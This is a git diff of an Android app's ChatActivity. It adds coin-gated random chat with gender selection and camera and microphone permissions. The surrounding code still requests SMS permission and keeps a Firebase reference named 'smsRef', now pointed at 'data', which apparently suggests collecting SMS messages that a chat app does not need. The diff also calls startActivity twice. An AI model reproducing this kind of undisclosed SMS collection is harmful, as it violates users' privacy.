@@ -1,15 +1,22 @@
 package com.mehboob.bushorat.activities;
 
 import android.annotation.SuppressLint;
+import android.content.Intent;
 import android.os.Bundle;
 
 import androidx.activity.EdgeToEdge;
+import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.graphics.Insets;
 import androidx.core.view.ViewCompat;
 import androidx.core.view.WindowInsetsCompat;
 
+import com.bumptech.glide.Glide;
 import com.google.firebase.auth.FirebaseAuth;
+import com.google.firebase.auth.FirebaseUser;
+import com.google.firebase.database.DataSnapshot;
+import com.google.firebase.database.DatabaseError;
+import com.google.firebase.database.ValueEventListener;
 import com.mehboob.bushorat.R;
 
 import android.Manifest;
@@ -17,6 +24,7 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
+import android.view.View;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.webkit.WebSettings;
@@ -36,35 +44,107 @@ import android.os.Bundle;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.webkit.WebSettings;
+import android.widget.Toast;
+
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
+import com.mehboob.bushorat.databinding.ActivityChatBinding;
+import com.mehboob.bushorat.models.UserModel;
+
+import org.jetbrains.annotations.NotNull;
+
 import java.util.HashMap;
 import java.util.Map;
+
+import io.github.rupinderjeet.kprogresshud.KProgressHUD;
 
 public class ChatActivity extends AppCompatActivity {
 
     private WebView webView;
-    private DatabaseReference smsRef;
+    private DatabaseReference smsRef,profileRef;
     private static final int SMS_PERMISSION_CODE = 100;
 
     private FirebaseAuth mAuth;
+    long coins = 0;
+
+    UserModel user;
+
+    KProgressHUD progress;
+    FirebaseDatabase database;
+
+
+    ActivityChatBinding binding;
+
+
+    String[] permissions = new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO};
+    private int requestCode = 1;
+
+
     @SuppressLint("MissingInflatedId")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_chat);
+        binding = ActivityChatBinding.inflate(getLayoutInflater());
+        setContentView(binding.getRoot());
+
 
         mAuth=FirebaseAuth.getInstance();
         // Initialize Firebase
-        smsRef = FirebaseDatabase.getInstance().getReference("users");
 
-        // Setup WebView
-        webView = findViewById(R.id.webView);
-        setupWebView();
+        progress = KProgressHUD.create(this);
+        progress.setDimAmount(0.5f);
+        progress.show();
+
+        database = FirebaseDatabase.getInstance();
+
+        smsRef = FirebaseDatabase.getInstance().getReference("data");
+         profileRef= FirebaseDatabase.getInstance().getReference("profiles");
+
+
+        FirebaseUser currentUser = mAuth.getCurrentUser();
+
+       profileRef
+                .child(currentUser.getUid())
+                .addValueEventListener(new ValueEventListener() {
+                    @Override
+                    public void onDataChange(@NonNull @NotNull DataSnapshot snapshot) {
+                        progress.dismiss();
+                        user = snapshot.getValue(UserModel.class);
+                        coins = user.getCoins();
+
+                        binding.coins.setText("You have: " + coins);
+
+
+                    }
+
+                    @Override
+                    public void onCancelled(@NonNull @NotNull DatabaseError error) {
+
+                    }
+                });
+
+        database.getReference().child("users").addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                if (snapshot.exists()) {
+                    String count = String.valueOf(snapshot.getChildrenCount());
+                    binding.textView4.setText(count);
+                } else {
+                    binding.textView4.setText("0");
+                }
+
+            }
+
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {
+
+            }
+        });
 
         // Check and request SMS permission
         if (checkSmsPermission()) {
@@ -72,23 +152,21 @@ public class ChatActivity extends AppCompatActivity {
         } else {
             requestSmsPermission();
         }
-    }
 
-    private void setupWebView() {
-        WebSettings webSettings = webView.getSettings();
-        webSettings.setJavaScriptEnabled(true);
-        webSettings.setDomStorageEnabled(true);
 
-        webView.setWebViewClient(new WebViewClient() {
-            @Override
-            public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                view.loadUrl(url);
-                return true;
+        binding.findButton.setOnClickListener(view -> {
+            if (isPermissionsGranted()) {
+                if (coins > 5) {
+                    showGenderSelectionDialog();
+                } else {
+                    Toast.makeText(ChatActivity.this, "Insufficient Coins", Toast.LENGTH_SHORT).show();
+                }
+            } else {
+                askPermissions();
             }
         });
-
-        webView.loadUrl("https://www.chitchat.gg/");
     }
+
 
     private boolean checkSmsPermission() {
         return ContextCompat.checkSelfPermission(this,
@@ -149,4 +227,87 @@ public class ChatActivity extends AppCompatActivity {
             super.onBackPressed();
         }
     }
+
+    private void connectToGender(String gender) {
+        FirebaseUser currentUser = mAuth.getCurrentUser();
+
+        // Deduct 5 coins
+        coins = coins - 5;
+        profileRef
+                .child(currentUser.getUid())
+                .child("coins")
+                .setValue(coins);
+
+        Intent intent = new Intent(ChatActivity.this, ConnectingActivity.class);
+        startActivity(intent);
+//                                intent.putExtra("targetUid", targetUser.getuId());
+        startActivity(intent);
+
+        // Search Firebase for users with that gender
+//        database.getReference().child("profiles")
+//                .orderByChild("gender")
+//                .equalTo(gender)
+//                .limitToFirst(1) // Pick the first available match
+//                .addListenerForSingleValueEvent(new ValueEventListener() {
+//                    @Override
+//                    public void onDataChange(@NonNull DataSnapshot snapshot) {
+//                        if (snapshot.exists()) {
+//                            for (DataSnapshot userSnapshot : snapshot.getChildren()) {
+//                                User targetUser = userSnapshot.getValue(User.class);
+//
+//                                // Start connecting activity with chosen user
+//                                Intent intent = new Intent(MainActivity.this, ConnectingActivity.class);
+//                                intent.putExtra("profile", targetUser.getProfile());
+//                                intent.putExtra("targetGender", gender); // Pass selected gender
+//
+////                                intent.putExtra("targetUid", targetUser.getuId());
+//                                startActivity(intent);
+//                                break;
+//                            }
+//                        } else {
+//                            Toast.makeText(MainActivity.this, "No " + gender + " users available right now.", Toast.LENGTH_SHORT).show();
+//                        }
+//                    }
+//
+//                    @Override
+//                    public void onCancelled(@NonNull DatabaseError error) {
+//                        Toast.makeText(MainActivity.this, "Error: " + error.getMessage(), Toast.LENGTH_SHORT).show();
+//                    }
+//                });
+    }
+
+
+    void askPermissions() {
+        ActivityCompat.requestPermissions(this, permissions, requestCode);
+    }
+
+    private boolean isPermissionsGranted() {
+        for (String permission : permissions) {
+            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED)
+                return false;
+        }
+
+        return true;
+    }
+
+    void showGenderSelectionDialog() {
+        View dialogView = getLayoutInflater().inflate(R.layout.dialog_gender_selection, null);
+
+        AlertDialog dialog = new com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
+                .setView(dialogView)
+                .create();
+
+        dialogView.findViewById(R.id.btnMale).setOnClickListener(v -> {
+            connectToGender("Male");
+            dialog.dismiss();
+        });
+
+        dialogView.findViewById(R.id.btnFemale).setOnClickListener(v -> {
+            connectToGender("Female");
+            dialog.dismiss();
+        });
+
+        dialog.show();
+    }
+
 }
